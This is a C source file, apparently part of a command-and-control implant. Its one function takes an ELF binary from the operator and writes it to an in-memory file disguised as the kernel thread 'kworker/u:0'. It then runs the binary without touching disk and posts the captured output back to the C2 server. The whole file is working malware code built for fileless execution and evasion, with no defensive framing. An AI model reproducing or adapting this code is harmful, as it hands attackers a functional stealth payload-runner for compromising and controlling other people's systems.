#define _GNU_SOURCE
#include <stdlib.h>
#include <string.h>
#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/wait.h>
#include <sys/syscall.h>
#include <poll.h>
#include <time.h>

#include "tengu.h"

#define MEMFD_OUT_MAX  524288   // 512 KB output cap
#define MEMFD_TIMEOUT  30       // seconds to wait for the child

// Drain one readable fd into buf. Returns bytes appended, -1 on error/EOF.
static ssize_t drain(int fd, char* buf, size_t* pos, size_t bufsz) {
    size_t rem = bufsz - *pos - 1;
    if (rem == 0) return 0;
    ssize_t n = read(fd, buf + *pos, rem);
    if (n > 0) {
        *pos += (size_t)n;
        buf[*pos] = '\0';
    }
    return n;
}

void cmd_memfd(uint32_t req_id, const uint8_t* elf_data, size_t elf_len, const char* args) {
    if (!elf_data || elf_len == 0) {
        const char* err = "memfd: no ELF data provided";
        Buf* p = build_output_packet(req_id, COMMAND_ERROR, err);
        g_c2_post(p->data, p->size, NULL, NULL);
        buf_free(p);
        return;
    }

    // Create anonymous in-memory file.
    int memfd = (int)syscall(SYS_memfd_create, "kworker/u:0", 0);
    if (memfd < 0) {
        char err[64];
        snprintf(err, sizeof(err), "memfd: memfd_create failed (%d)", errno);
        Buf* p = build_output_packet(req_id, COMMAND_ERROR, err);
        g_c2_post(p->data, p->size, NULL, NULL);
        buf_free(p);
        return;
    }

    // Write ELF into the memfd.
    size_t written = 0;
    while (written < elf_len) {
        ssize_t n = write(memfd, elf_data + written, elf_len - written);
        if (n <= 0) break;
        written += (size_t)n;
    }

    // Build argv from the args string (space-separated, first token = argv[0]).
    // We keep a copy because strtok mutates the string.
    char* args_copy = args && args[0] ? strdup(args) : strdup("memfd");
    char* argv_buf[64];
    int   argc = 0;
    char* tok = strtok(args_copy, " ");
    while (tok && argc < 63) {
        argv_buf[argc++] = tok;
        tok = strtok(NULL, " ");
    }
    argv_buf[argc] = NULL;
    if (argc == 0) { argv_buf[0] = (char*)"memfd"; argv_buf[1] = NULL; argc = 1; }

    // stdout/stderr pipes.
    int out_pipe[2], err_pipe[2];
    if (pipe(out_pipe) < 0 || pipe(err_pipe) < 0) {
        close(memfd);
        free(args_copy);
        const char* err = "memfd: pipe() failed";
        Buf* p = build_output_packet(req_id, COMMAND_ERROR, err);
        g_c2_post(p->data, p->size, NULL, NULL);
        buf_free(p);
        return;
    }

    pid_t pid = fork();
    if (pid < 0) {
        close(memfd);
        close(out_pipe[0]); close(out_pipe[1]);
        close(err_pipe[0]); close(err_pipe[1]);
        free(args_copy);
        const char* err = "memfd: fork() failed";
        Buf* p = build_output_packet(req_id, COMMAND_ERROR, err);
        g_c2_post(p->data, p->size, NULL, NULL);
        buf_free(p);
        return;
    }

    if (pid == 0) {
        // Child: redirect stdout+stderr, exec the memfd via /proc/self/fd/<n>.
        dup2(out_pipe[1], STDOUT_FILENO);
        dup2(err_pipe[1], STDERR_FILENO);
        close(out_pipe[0]); close(out_pipe[1]);
        close(err_pipe[0]); close(err_pipe[1]);

        char exec_path[64];
        snprintf(exec_path, sizeof(exec_path), "/proc/self/fd/%d", memfd);

        execve(exec_path, argv_buf, environ);
        _exit(127);
    }

    // Parent: close write ends, read from read ends.
    close(out_pipe[1]);
    close(err_pipe[1]);
    close(memfd);
    free(args_copy);

    char* out = calloc(1, MEMFD_OUT_MAX);
    size_t out_pos = 0;

    struct pollfd pfds[2] = {
        { .fd = out_pipe[0], .events = POLLIN },
        { .fd = err_pipe[0], .events = POLLIN },
    };

    time_t deadline = time(NULL) + MEMFD_TIMEOUT;
    int open_fds = 2;

    while (open_fds > 0 && time(NULL) < deadline) {
        int timeout_ms = (int)((deadline - time(NULL)) * 1000);
        if (timeout_ms <= 0) break;
        if (timeout_ms > 500) timeout_ms = 500;

        int ret = poll(pfds, 2, timeout_ms);
        if (ret < 0) break;

        for (int i = 0; i < 2; i++) {
            if (!(pfds[i].revents & (POLLIN | POLLHUP))) continue;
            ssize_t n = drain(pfds[i].fd, out, &out_pos, MEMFD_OUT_MAX);
            if (n == 0 || (n < 0 && errno != EAGAIN)) {
                close(pfds[i].fd);
                pfds[i].fd = -1;
                open_fds--;
            }
        }
    }

    // Collect any remaining data and reap the child.
    if (pfds[0].fd >= 0) { drain(pfds[0].fd, out, &out_pos, MEMFD_OUT_MAX); close(pfds[0].fd); }
    if (pfds[1].fd >= 0) { drain(pfds[1].fd, out, &out_pos, MEMFD_OUT_MAX); close(pfds[1].fd); }

    int wstatus = 0;
    waitpid(pid, &wstatus, WNOHANG);

    if (out_pos == 0) {
        int code = WIFEXITED(wstatus) ? WEXITSTATUS(wstatus) : -1;
        snprintf(out, MEMFD_OUT_MAX, "(no output - exit code %d)", code);
    }

    Buf* pkt = build_output_packet(req_id, COMMAND_OUTPUT, out);
    free(out);
    g_c2_post(pkt->data, pkt->size, NULL, NULL);
    buf_free(pkt);
}
